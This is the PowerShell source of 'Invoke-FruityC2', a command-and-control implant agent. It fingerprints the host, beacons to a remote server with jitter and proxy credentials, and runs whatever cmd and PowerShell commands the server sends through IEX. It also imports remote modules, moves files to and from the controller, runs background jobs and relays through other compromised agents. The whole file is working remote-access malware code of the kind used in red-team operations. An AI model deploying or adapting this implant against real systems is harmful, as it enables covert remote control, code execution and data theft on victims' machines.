# Copyright (C) 2017 xtr4nge [_AT_] gmail.com
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
#

function Invoke-FruityC2 {
    param(
        [String]$r_server = "",
        [String]$r_port = "",
        [String]$r_ssl = "",
        [String]$path_get = "",
        [String]$path_post = "",
        [String]$post_id = "",
        [String]$session_id = "SESSIONID",
        [Int]$stime = 5,
        [Int]$jitter = 0,
        [String]$UA = "",
        [Bool]$stager = $true,
        [String]$target = "",
        [String]$mode = "normal"
    )

    $proxy_list = @{}
    $proxy_agent = @{}

    clear

    [Int]$script:stime = $stime
    [Int]$script:jitter = $jitter
    [String]$script:UA = $UA
    [String]$script:path_get = $path_get
    [String]$script:path_post = $path_post
    [String]$script:post_id = $post_id
    [String]$script:session_id = $session_id
    [String]$script:target = $target
    [String]$script:mode = $mode

    # DEBUG
    Write-Host "[DEBUG DEFAULT]" -BackgroundColor Red
    Write-Host "stime: $script:stime"
    Write-Host "jitter: $script:jitter"
    Write-Host "UA: $script:UA"
    Write-Host "GET: $script:path_get"
    Write-Host "POST: $script:path_post"
    Write-Host "POST-ID: $script:post_id"
    Write-Host "SESSION-ID: $script:session_id"
    Write-Host "target: $script:target"
    Write-Host "-------"

    # http://waynes-world-it.blogspot.co.uk/2008/05/reading-web-content-with-powershell.html

    [String]$UUID = ""
    [String]$KEY = "SECRET"
    [bool]$option_base64 = $false
    [bool]$option_encryption = $false
    [bool]$option_compression = $true

    [Bool]$autoexit = $false

    $r_server = $r_server
    $r_port = $r_port

    function b64encoder($output) {
        $b = [System.Text.Encoding]::UTF8.GetBytes($output)
        $output = [System.Convert]::ToBase64String($b)
        $output = $output.replace("+","-") # BASE64 URLSAFE
        $output = $output.replace("/","_") # BASE64 URLSAFE
        return $output
    }

    function b64decoder($data) {
        $data = $data.replace("-","+") # BASE64 URLSAFE
        $data = $data.replace("_","/") # BASE64 URLSAFE
        $data = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($data))
        return $data
    }

    function getUUID() {
        $string = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Cryptography' | Select-Object -ExpandProperty MachineGuid) | Out-String
        $string = $string.Trim()
        $string = [int][double]::Parse((Get-Date -UFormat %s))
        return $string
    }

    function getUser() {
        $string = ([System.Security.Principal.WindowsIdentity]::GetCurrent().Name) | Out-String
        $string = $string.Trim()
        return $string
    }

    function getMandatoryLabel() {
        if(([Environment]::UserName).ToLower() -eq "system"){$string='4'}
        elseif(([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator") -eq $true){$string='3'} # 3=High
        else {$string='2'}
        return $string
    }

    function getComputerName() {
        $string = (Get-WmiObject Win32_OperatingSystem).CSName | Out-String
        $string = $string.Trim()
        return $string
    }

    function getComputerIP() {
        $string = (Test-Connection $env:COMPUTERNAME -count 1 | select Ipv4Address) | FT -HideTableHeaders |  Out-String
        $string = $string.Trim()
        return $string
    }

    function getVersion() {
        $string = (Get-WmiObject Win32_OperatingSystem).Name.split('|')[0] | Out-String
        $string = $string.Trim()
        return $string
    }

    function getOSArchitecture() {
        $string = (Get-WmiObject Win32_OperatingSystem).OSArchitecture  | Out-String
        $string = $string.Trim()
        return $string
    }

    Function encrypt([string]$str) {
        # NOTE: You need to implement your own encryption/decryption method. (FUNCTION: encrypt and decrypt)

        return $data
    }

    Function decrypt([string]$str) {
        # NOTE: You need to implement your own encryption/decryption method. (FUNCTION: encrypt and decrypt)

        return $data
    }

    function deflate($data) { # COMPRESS DATA
        # REF: https://gist.github.com/strazzere/5faa709a3db9e1dcf3b5
        # REF: http://chernodv.blogspot.co.uk/2014/12/powershell-compression-decompression.html
        $s = $data
        $ms = New-Object System.IO.MemoryStream
        $cs = New-Object System.IO.Compression.DeflateStream($ms, [System.IO.Compression.CompressionMode]::Compress)
        $sw = New-Object System.IO.StreamWriter($cs)
        $sw.Write($s)
    
        $sw.Close();
        $s = [System.Convert]::ToBase64String($ms.ToArray())
        $s = $s.replace("+","-") # BASE64 URLSAFE
        $s = $s.replace("/","_") # BASE64 URLSAFE
        return $s
    }

    function inflate($data) { # DECOMPRESS DATA
        $data = $data.replace("-","+") # BASE64 URLSAFE
        $data = $data.replace("_","/") # BASE64 URLSAFE
        $data = [System.Convert]::FromBase64String($data)

        $ms = New-Object System.IO.MemoryStream
        $ms.Write($data, 0, $data.Length)
        $ms.Seek(0,0) | Out-Null
        $sr = New-Object System.IO.StreamReader(New-Object System.IO.Compression.DeflateStream($ms, [System.IO.Compression.CompressionMode]::Decompress))
        return $sr.ReadToEnd()
    }

    Function rx_data($data) {
        #if ($option_base64 -eq $true) { $data = b64decoder($data) }
        if ($option_compression -eq $true) { $data = inflate($data) }
        if ($option_encryption -eq $true) { $data = decrypt($data) }
        return $data
    }

    Function tx_data($data) {
        if ($option_encryption -eq $true) { $data = encrypt($data) }
        if ($option_compression -eq $true) { $data = deflate($data) }
        #if ($option_base64 -eq $true) { $data = b64encoder($data) }
        return $data
    }

    if ($script:target -eq "") {

        $VERSION = getVersion
        $USER = getUser
        $LABEL = getMandatoryLabel
        $NAME = getComputerName
        $IP = getComputerIP
        $UUID = getUUID
        $OS_ARCH = getOSArchitecture
        $MODE = $script:mode
        
        # DEBUG
        Write-Host "[DEBUG]" -BackgroundColor Red
        $VERSION
        $USER
        $LABEL
        $NAME
        $IP
        $UUID
        Write-Host "-------"

        $TARGET = tx_data("$UUID|$VERSION|$USER|$LABEL|$NAME|$IP|$OS_ARCH|$MODE")
    } else {
        $TARGET = $script:target
        $_T = rx_data($TARGET)
        $UUID = $_T.split("|")[0]
    }

    function Get-Data {
        param($path = $script:path_get)
        try{
            $SESSION_ID = $script:session_id
            $wc = new-object system.net.WebClient
            $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
            $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
            $wc.Headers.Add("User-Agent",$UA)
            $wc.Headers.Add("Cookie", "$SESSION_ID=$TARGET;")

            $request = "http$($r_ssl)://$($r_server):$($r_port)$($path)"

            #Write-Host "GET-DATA: $request"

            $data = $wc.DownloadString($request)
            return $data
        }
        catch [Net.WebException] {
            Write-Host "Get-Data ERROR."
        }
    }

    function Send-Data {
        param(
            $param, 
            $path = $script:path_post,
            $post_id = $script:post_id,
            $TARGET = $TARGET
            )
        try{
            $SESSION_ID = $script:session_id
            $wc = new-object system.net.WebClient
            $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
            $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
            $wc.Headers.Add("User-Agent",$UA)
            $wc.Headers.Add("Cookie", "$SESSION_ID=$TARGET;")

            $request = "http$($r_ssl)://$($r_server):$($r_port)$($path)"

            Write-Host $request

            $enc = [system.Text.Encoding]::UTF8
            $send = $enc.GetBytes($post_id+"="+$param)
            $data = $wc.UploadData($request, "POST", $send);
            #$data = $wc.UploadString("http://"+$r_server+"/send", "POST", $send);
        }
        catch [System.Net.WebException]{
            Write-Host "Send-Data ERROR."
        }
    }

    function stager() {
        $path_stager = -join ((65..90) + (97..122) | Get-Random -Count 30 | % {[char]$_})

        $data = Get-Data -path "/$path_stager"

        #Write-Host "STAGER: $data"

        [String]$data = rx_data($data) # DECODE/DECRYPT RECEIVED DATA
    
        [Array[]]$temp = $data.split("|")

        $script:stime = [convert]::ToInt32($temp[0],10)
        $script:jitter = [convert]::ToInt32($temp[1],10)
        $script:UA = $temp[2]
        $script:path_get = $temp[3]
        $script:path_post = $temp[4]
        $script:post_id = $temp[5]
        $script:session_id = $temp[6]
    
    }

    function execShellCommand ($command) {
        try {
            $string = IEX("cmd /c $command") | Out-String
            return $string
        }
        catch {
            return "[COMMAND ERROR] : $command"
        }
    }

    function execPowershellCommand ($command) {
        try {
            $string = IEX("$command") | Out-String
            return $string
        }
        catch {
            return "[COMMAND ERROR] : $command"
        }
    }

    function getBeaconTime() {
        $stime = $script:stime
        $jitter = $script:jitter

        if ($jitter -gt 0) {
            $value = ($stime*$jitter)/100
            $sleepTime = Get-Random -minimum ($stime-$value) -maximum ($stime+$value+1);

            #return [convert]::ToInt32($sleepTime)
            return $sleepTime
        } else {
            return $stime
        }
    }

    function Start-AgentJob {
        param($data)

        $JobName = -join ((65..90) + (97..122) | Get-Random -Count 10 | % {[char]$_})
        $job = Start-Job -Name "job_$JobName" -Scriptblock ([scriptblock]::Create($data))
        return $job.Name
    }

    function List-AgentJob() {
        
        $output = Get-Job

        Write-Host $output # DEBUG

        $output = tx_data($output) # ENCRYPT/ENCODE DATA TO TRANSFER
        Send-Data -param "$output"
    }

    function Get-AgentJob() {
        foreach ($x in Get-Job) {
    
            if ($x.State -eq "Completed") {
                $job_name =  $x.Name

                $data = Receive-Job -name $job_name
                $output = $data | Out-String

                Write-Host $output # DEBUG

                $output = tx_data($output) # ENCRYPT/ENCODE DATA TO TRANSFER
                Send-Data -param "$output"

                stop-Job -Name $job_name
                Remove-Job -Name $job_name

                Write-Host "----------"
            
            } ElseIf ($x.State -eq "Failed") {
                $job_name =  $x.Name

                $output = tx_data("Job Failed =(") # ENCRYPT/ENCODE DATA TO TRANSFER
                Send-Data -param "$output"

                stop-Job -Name $job_name
                Remove-Job -Name $job_name

            }
        }
    }

    function Send-Data-Proxy {
        param(
            $param, 
            $path,
            $post_id = "send",
            $agent = "",
            $dest,
            $port
            )
        try{
            $wc = new-object system.net.WebClient
            $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
            $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
            $wc.Headers.Add("User-Agent",$UA)
            $enc_agent = tx_data($agent)
            $wc.Headers.Add("Cookie", "SESSIONID=$enc_agent;")

            $request = "http://$($dest):$($port)$($path)"

            Write-Host $request

            $enc = [system.Text.Encoding]::UTF8
            #$send = $enc.GetBytes($post_id+"="+$param)
            $enc_param = tx_data($param)
            $send = $enc.GetBytes($enc_param)
            $data = $wc.UploadData($request, "POST", $send);
        }
        catch [System.Net.WebException] {
            Write-Host "ERROR: Send-Data-Proxy" -ForegroundColor Red
        }
    }

    function Get-Data-Proxy {
        param(
            $UA,
            $r_server,
            $r_port,
            $r_ssl,
            $path,
            $TARGET = "",
            $SESSION_ID = "SESSIONID"
        )
        try{
            $TARGET = tx_data($TARGET)

            $wc = new-object system.net.WebClient
            $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
            $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
            $wc.Headers.Add("User-Agent",$UA)
            $wc.Headers.Add("Cookie", "$SESSION_ID=$TARGET;")

            $request = "http$($r_ssl)://$($r_server):$($r_port)$($path)"

            Write-Host $request

            [String]$data = $wc.DownloadString($request)
            return $data
        }
        catch [Net.WebException] {
            Write-Host "ERROR: Get-Data-Proxy" -ForegroundColor Red
        }
    }

    function set_proxy_task() {
        param(
            [String]$dest = "localhost",
            [String]$port = "8080",
            [String]$param = "",
            [String]$agent = "",
            [String]$path = "/set_task"
        )

        Write-Host "DEBUG: set_proxy_task"

        $wc = new-object system.net.WebClient
        $url = "http://$($destination):$($port)$($path)"
        Send-Data-Proxy -dest $dest -port $port -path "/set_task" -param $param -agent "$agent|||||||"

        # PROXY AGENT ENABLE CHECKING RESULTS
        #$proxy_agent[$agent] = $True
        try {
            #foreach ($key in $proxy_agent.Keys) { Write-Host $key.Trim() }
            $proxy_agent[$agent][1] = $True
        } catch {
            Write-Host "ERROR: set_proxy_task" -ForegroundColor Red
        }
    }

    function get_proxy_result() {
        param(
            [String]$dest = "localhost",
            [String]$port = "8080",
            [String]$param = "",
            [String]$agent = "",
            [String]$path = "/get_result"
        )
        # GET RESULT FROM PROXY
        [String]$data = Get-Data-Proxy -r_server $dest -r_port $port -path $path -TARGET "$agent|||||||"

        $output = $data.Split("|")
        
        # SEND RESULT TO C2
        Send-Data -param $output[1].Trim() -TARGET $output[0].Trim()

        # IF LAST RESULT IS JOB THEN CHECK RESULT AGAIN
        try {
            $temp = ""
            $temp = rx_data($output[1].Trim())
            $temp = $temp.substring(0,3)
        } catch { }
        if ($temp -ne "Job") {
            $proxy_agent[$agent][1] = $False
        }
    }

    function link_proxy() {
        param(
            [String]$proxy = "",
            [String]$port = "",
            [String]$path = "/linked"`
        )

        # ADD PROXY TO PROXY_LIST
        $proxy_list["$($proxy):$($port)"] = "$port"

        $wc = new-object system.net.WebClient
        $url = "http://$($proxy):$($port)$($path)"
        Write-Host $url # DEBUG
        $output = $wc.DownloadString($url).Split("|")

        foreach ($x in $output) {
            $enc_target = $x
            $enc_param = tx_data("linked:$UUID")
            
            # ADD AGENTS TO PROXY_AGENT
            $data = rx_data($x)
            $agent = ($data.split("|")[0]) | Out-String
            $agent = $agent.Trim()
            #$proxy_agent["$agent"] = $False
            $proxy_agent[$agent] = @("$($proxy):$($port)", $False)

            Send-Data -param $enc_param -TARGET $enc_target
        }
    }

    function autoProxyAgent() {
        try {
            foreach ($key in $($proxy_agent.Keys)) {
                if ($($proxy_agent[$key][1]) -eq $True) {
                    $_p = $proxy_agent[$key][0].split(":")

                    get_proxy_result -dest $_p[0] -port $_p[1] -agent $key
                }
            }
        } catch {
            Write-Host "ERROR: autoProxyAgent" -ForegroundColor Red
        }
    }

    # DEBUG
    if ($stager -eq $true) { stager }
    Write-Host "[DEBUG PROFILE]" -BackgroundColor Red
    Write-Host "stime: $script:stime"
    Write-Host "jitter: $script:jitter"
    Write-Host "UA: $script:UA"
    Write-Host "GET: $script:path_get"
    Write-Host "POST: $script:path_post"
    Write-Host "POST-ID: $script:post_id"
    Write-Host "SESSION-ID: $script:session_id"
    Write-Host "-------"

    $timeout = new-timespan -Minutes 10
    $sw = [diagnostics.stopwatch]::StartNew()

    [Int]$flag = 0
    #$beacon_sleep = 5

    # INFINITE LOOP IF AUTOEXIT IS FALSE
    $timetorun = $true

    while ($timetorun){
    
        # IF AUTOEXIT IS TRUE, IT WILL EXIT AFTER TIMEOUT
        if ($autoexit -eq $true) {
            if ($sw.elapsed -gt $timeout) {
                #ORGINAL: $sw.elapsed -lt $timeout
                $timetorun = $false
            }
        }

        try
        {

            # CHECK AGENTS
            autoProxyAgent

            #[String]$data = $WebClient.DownloadString($WebObject)
            [String]$data = Get-Data
            if ($data -ne "") { 
                
                # DECODE/DECRYPT RECEIVED DATA
                try {
                    [String]$data = rx_data($data)
                } catch {
                    #write-host "ERROR.."
                    #write-host $data
                    $data = ""
                }
                
                # PARSE DECODED DATA
                [Array[]]$temp = $data.split("|")

                try { [String]$exec_command = $temp[0] } 
                catch { $exec_command = "" }

                try { [Int]$exec_flag = [convert]::ToInt32($temp[1], 10) } 
                catch { $exec_flag = 0 }

                try { [String]$exec_data = $temp[2] }
                catch { $exec_data = "" }

                try { [String]$exec_import = $temp[3] } 
                catch { $exec_import = "" }

                #DEBUG
                try {
                    if ($exec_command -ne "") {
                        write-host "[DEBUG EXEC]" -BackgroundColor Red
                        write-host "EXEC_FLAG: $exec_flag"
                        write-host "EXEC_COMMAND: $exec_command"
                        Try { write-host "EXEC_DATA: $($exec_data.substring(1,20))" } Catch {}
                        Try { write-host "EXEC_IMPORT: $($exec_import.substring(1,20))" } Catch {}
                        write-host "---"
                    }
                } catch {
                    write-host "[DEBUG ERROR]"
                }

                if ($flag -lt $exec_flag -or 1 -eq 1 -and $exec_command -ne "?" -and $exec_command -ne "")
                {

                    # RESET TIMEOUT
                    $sw = [diagnostics.stopwatch]::StartNew()

                    $flag = "$exec_flag"

                    if ($data -eq "EXIT"){
                        write-host "Connection Closed..."
                        return
                    }

                    # CHANGE BECON SLEEP TIME
                    ElseIf ($exec_command.StartsWith("sleep")){
                        [Array[]]$temp = $exec_command.split(" ")
                        [String]$exec_command = $temp[0]
                        [Int]$beacon_sleep = [convert]::ToInt32($temp[1], 10)
                        Write-Host $beacon_sleep # DEBUG
                        $script:stime = $beacon_sleep
                        Write-Host $script:stime # DEBUG
                        #return
                    }

                    # DOWNLOAD A FILE FROM C2
                    ElseIf ($exec_command.StartsWith("upload")){
                        $exec_data = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($exec_data))
                        $upload_name = $exec_command.split(" ")[1]

                        $path = pwd

                        [Byte[]] $temp = $exec_data -split ' ' ; 
                        [System.IO.File]::WriteAllBytes("$path\$upload_name", $temp)

                        $output = execPowershellCommand("ls $path\$upload_name")
                    
                        Write-Host $output # DEBUG

                        $output = tx_data($output) # ENCRYPT/ENCODE DATA TO TRANSFER
                        #Send-Data -param "send=$output"
                        Send-Data -param "$output"

                        Write-Host  "upload done..." # DEBUG
                    }

                    # UPLOAD A FILE TO C2
                    ElseIf ($exec_command.StartsWith("download")){
                        Write-Host $exec_command # DEBUG

                        $upload_file = $exec_command.split(" ")[1]

                        $path = pwd

                        $bytes = [System.IO.File]::ReadAllBytes("$path\$upload_file")

                        $output = ""
                        foreach ($byte in $bytes) {
                            $output += [String]::Format("{0:D}",$byte) + " "
                        }

                        $output = $output.Trim()
                        $output = tx_data($output) # ENCRYPT/ENCODE DATA TO TRANSFER
                        Send-Data -param "$output"

                        Write-Host  "download done..." # DEBUG
                    }

                    # IMPORT POWERSHELL MODULE
                    ElseIf ($exec_command -eq "powershell-import"){
                        $exec_data = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($exec_data))
                        IEX $exec_data

                        Write-Host "powershell-import..."
                        $output = tx_data("Import Completed") # ENCRYPT/ENCODE DATA TO TRANSFER
                        Send-Data -param "$output"
                    }

                    # EXEC POWERSHELL COMMAND
                    ElseIf ($exec_command.StartsWith("powershell ")){
                        $exec_command = $exec_command -replace "^powershell ",""

                        $output = execPowershellCommand($exec_command)
                    
                        Write-Host $output # DEBUG

                        $output = tx_data($output) # ENCRYPT/ENCODE DATA TO TRANSFER
                        Send-Data -param "$output"
                    }

                    # EXEC POWERSHELL COMMAND [JOB]
                    ElseIf ($exec_command.StartsWith("powershell_job ")){
                        $exec_command = $exec_command -replace "^powershell_job ",""

                        $job_name = Start-AgentJob -data $exec_command
                        $output = tx_data("Job Started [powershell]: $job_name") # ENCRYPT/ENCODE DATA TO TRANSFER
                        Send-Data -param "$output"
                    }

                    # DOWNLOAD AND EXEC POWERSHELL SCRIPT
                    ElseIf ($exec_command -eq "powershell-runscript"){
                        $exec_command = $exec_command.Replace("powershell-runscript", "")
                        $exec_data = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($exec_data))
                        
                        $output = execPowershellCommand($exec_data)
                        Write-Host $output # DEBUG

                        $output = tx_data($output) # ENCRYPT/ENCODE DATA TO TRANSFER
                        Send-Data -param "$output"
                    }

                    ElseIf ($exec_command.StartsWith("powershell-encoded")){
                        echo "COMMAND: powershell-encoded"
                        <#
                        $exec_command = $exec_command.Replace("powershell-encoded ", "")
                        # IMPORT MODULE IF NOT EMPTY
                        if ($exec_import -ne "") { IEX([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($exec_import))) }
                        # DECODE AND EXEC COMAND
                        $exec_data = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($exec_data)) # ENCODED
                        #$exec_data = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($exec_data)) # BASE64
                        $output = execPowershellCommand($exec_data)

                        Write-Host $output # DEBUG

                        $output = tx_data($output) # ENCRYPT/ENCODE DATA TO TRANSFER
                        Send-Data -param "send=$output"
                        #>

                        # DECODE AND EXEC COMAND
                        $exec_data = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($exec_data)) # ENCODED
                        if ($exec_import -ne "") {
                            $job_name = Start-AgentJob -data ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($exec_import)) + " ; $exec_data ")
                        } else {
                            $job_name = Start-AgentJob -data ($exec_data)
                        }

                        $output = tx_data("Job Started [encoded]: $job_name") # ENCRYPT/ENCODE DATA TO TRANSFER
                        Send-Data -param "$output"

                    }

                    # PRINT CURRENT DIRECTORY
                    ElseIf ($exec_command -eq ("pwd")){
                        $output = execPowershellCommand("pwd")
                        Write-Host $output # DEBUG

                        $output = tx_data($output) # ENCRYPT/ENCODE DATA TO TRANSFER
                        Send-Data -param "$output"
                    }

                    # LIST FILES
                    ElseIf ($exec_command -eq ("ls")){
                        $output = execPowershellCommand("ls")
                        Write-Host $output # DEBUG

                        $output = tx_data($output) # ENCRYPT/ENCODE DATA TO TRANSFER
                        Send-Data -param "$output"
                    }

                    # CHANGE CURRENT PATH
                    ElseIf ($exec_command.StartsWith("cd ")){
                        $output = execPowershellCommand($exec_command)
                        $output = execPowershellCommand("pwd")
                        Write-Host $output # DEBUG

                        $output = tx_data($output) # ENCRYPT/ENCODE DATA TO TRANSFER
                        Send-Data -param "$output"
                    }

                    # EXEC CMD COMMAND
                    ElseIf ($exec_command.StartsWith("shell ")){
                        $exec_command = $exec_command -replace "^shell ",""
                        
                        $output = execShellCommand($exec_command)
                        Write-Host $output # DEBUG

                        $output = tx_data($output) # ENCRYPT/ENCODE DATA TO TRANSFER
                        Send-Data -param "$output"
                    }

                    # EXEC CMD COMMAND [JOB]
                    ElseIf ($exec_command.StartsWith("shell_job ")){
                        $exec_command = $exec_command -replace "^shell_job ",""
                        
                        $job_name = Start-AgentJob -data $exec_command
                        $output = tx_data("Job Started [shell]: $job_name") # ENCRYPT/ENCODE DATA TO TRANSFER
                        Send-Data -param "$output"
                    }

                    # EXEC USEMODULE [JOB]
                    ElseIf ($exec_command.StartsWith("usemodule")){
                        Write-Host "COMMAND: usemodule"
                        
                        # DECODE AND EXEC COMAND
                        $exec_data = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($exec_data)) # ENCODED
                        if ($exec_import -ne "") {
                            $job_name = Start-AgentJob -data ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($exec_import)) + " ; $exec_data ")
                        } else {
                            $job_name = Start-AgentJob -data ($exec_data)
                        }

                        $output = tx_data("Job Started [usemodule]: $job_name") # ENCRYPT/ENCODE DATA TO TRANSFER
                        Send-Data -param "$output"

                        Get-Job

                    }

                    # EXIT 
                    ElseIf ($exec_command -eq ("exit")){
                        Write-Host "EXIT..."
                        break
                    }

                    ElseIf ($exec_command -eq ("checkin")){
                        Write-Host "I'm alive ;)" # DEBUG
                        $output = "ok"

                        $output = tx_data($output) # ENCRYPT/ENCODE DATA TO TRANSFER
                        Send-Data -param "$output"
                    }

                    ElseIf ($exec_command -eq ("jobs")){
                    
                        $output = Get-Job | Out-String

                        Write-Host $output # DEBUG

                        $output = tx_data($output) # ENCRYPT/ENCODE DATA TO TRANSFER
                        Send-Data -param "$output"
                    }

                    ElseIf ($exec_command.startsWith("set_passive_task")){
                        $x = $exec_command.split("*")
                        set_passive_task -destination $x[1] -port $x[2] -agent $x[3] -command $x[4]
                    }

                    ElseIf ($exec_command -eq ("get_passive_task")){
                        get_passive_task
                    }

                    ElseIf ($exec_command.startsWith("set_proxy_task")){
                        $x = $exec_command.split("*")
                        set_proxy_task -dest $x[1] -port $x[2] -agent $x[3] -param "$($x[4])|1|$exec_data|$exec_import"
                    }

                    ElseIf ($exec_command.startsWith("get_proxy_result")){
                        $x = $exec_command.split("*")
                        get_proxy_result -dest $x[1] -port $x[2] -agent $x[3]
                    }

                    ElseIf ($exec_command.startsWith("proxy_link") -or $exec_command.startsWith("link_proxy")){
                        $x = $exec_command.split(" ")
                        link_proxy -proxy $x[1] -port $x[2]
                    }

                    ElseIf ($exec_command.startsWith("push_agent")){
                        $x = $exec_command.split(" ")
                        $exec_data = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($exec_data)) # ENCODED
                        $agent = rx_data($TARGET)
                        Send-Data-Proxy -dest $x[1] -port $x[2] -path "/set_agent" -param $exec_data -agent $agent
                    }

                    ElseIf ($exec_command.startsWith("proxy_kill")){
                        $x = $exec_command.split(" ")
                        Send-Data-Proxy -dest $x[1] -port $x[2] -path "/kill" -param $exec_data
                    }

                    ElseIf ($exec_command.startsWith("proxy_reset")){
                        $x = $exec_command.split(" ")
                        Send-Data-Proxy -dest $x[1] -port $x[2] -path "/reset" -param $exec_data
                    }

                    Else {
                        $output = "I don't know what to do with this command =\"
                        $output = tx_data($output) # ENCRYPT/ENCODE DATA TO TRANSFER
                        Send-Data -param "$output"
                    }
                }
                # END COMMANDS
            }
        }
        catch
        {
            echo "[AGENT ERROR]"
        }

        Get-AgentJob

        $sleepTime = getBeaconTime # GET SLEEP TIME AND JITTER
        start-sleep -seconds $sleepTime
    }
    echo "Bye Bye ;)"
}
#Invoke-FruityC2 -r_server "x.x.x.x" -r_port "xx" -r_ssl = ""
